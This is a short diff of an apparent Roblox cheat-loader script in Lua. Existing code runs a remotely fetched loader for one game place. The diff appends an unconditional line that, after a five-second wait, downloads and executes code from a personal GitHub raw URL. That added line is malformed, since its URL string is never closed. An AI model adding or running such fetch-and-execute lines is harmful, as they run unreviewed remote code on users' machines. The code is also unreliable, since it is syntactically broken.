@@ -35,3 +35,5 @@ if game.PlaceId == 85896571713843 then
 
     loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3dc52e6a2fc4f671b66757e93f4fd38b.lua"))()
 end
+task.wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/GD1))()
